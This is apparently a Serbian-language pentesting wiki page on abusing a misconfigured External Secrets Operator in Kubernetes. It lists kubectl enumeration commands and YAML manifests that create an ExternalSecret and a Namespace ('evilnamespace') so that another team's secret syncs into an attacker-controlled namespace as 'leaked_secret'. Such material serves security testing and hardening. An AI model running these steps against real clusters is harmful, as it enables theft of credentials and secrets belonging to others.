# External Secret Operator

**Originalni autor ove stranice je** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Ova stranica daje nekoliko saveta o tome kako možete ukrasti tajne iz pogrešno konfigurisane ESO ili aplikacije koja koristi ESO za sinhronizaciju svojih tajni.

## Odricanje od odgovornosti

Tehnika prikazana u nastavku može raditi samo kada su ispunjeni određeni uslovi. Na primer, zavisi od zahteva potrebnih da se dozvoli sinhronizacija tajne u prostoru imena koji posedujete / kompromitujete. Morate to sami da otkrijete.

## Preduslovi

1. Pristup u kubernetes / openshift klasteru sa administratorskim privilegijama na prostoru imena
2. Pristup za čitanje na najmanje ExternalSecret na nivou klastera
3. Otkrivanje da li su potrebne oznake / anotacije ili članstvo u grupi koje omogućavaju ESO da sinhronizuje vašu tajnu. Ako imate sreće, možete slobodno ukrasti bilo koju definisanu tajnu.

### Prikupljanje informacija o postojećem ClusterSecretStore

Pretpostavljajući da imate korisnika koji ima dovoljno prava da pročita ovaj resurs; počnite tako što ćete prvo nabrojati postojeće _**ClusterSecretStores**_.
```sh
kubectl get ClusterSecretStore
```
### ExternalSecret enumeracija

Pretpostavimo da ste pronašli ClusterSecretStore nazvan _**mystore**_. Nastavite sa enumeracijom njegovog povezanog externalsecret.
```sh
kubectl get externalsecret -A | grep mystore
```
_Ovaj resurs je ograničen na namespace, tako da, osim ako već ne znate koji namespace da tražite, dodajte opciju -A da biste pretražili sve namespace._

Trebalo bi da dobijete listu definisanih externalsecret. Pretpostavimo da ste pronašli externalsecret objekat pod nazivom _**mysecret**_ definisan i korišćen od strane namespace _**mynamespace**_. Prikupite još informacija o tome kakvu vrstu tajne sadrži.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Sastavljanje delova

Odavde možete dobiti ime jednog ili više tajnih imena (kao što je definisano u Secret resursu). Dobićete izlaz sličan:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Do sada smo dobili:

- Ime ClusterSecretStore
- Ime ExternalSecret
- Ime tajne

Sada kada imamo sve što nam je potrebno, možete kreirati ExternalSecret (i eventualno patch-ovati/kreirati novi Namespace kako biste ispunili preduslove potrebne za sinhronizaciju vaše nove tajne):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Nakon nekoliko minuta, ako su ispunjeni uslovi za sinhronizaciju, trebali biste moći da vidite procurenu tajnu unutar vašeg imenskog prostora.
```sh
kubectl get secret leaked_secret -o yaml
```
## Reference

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
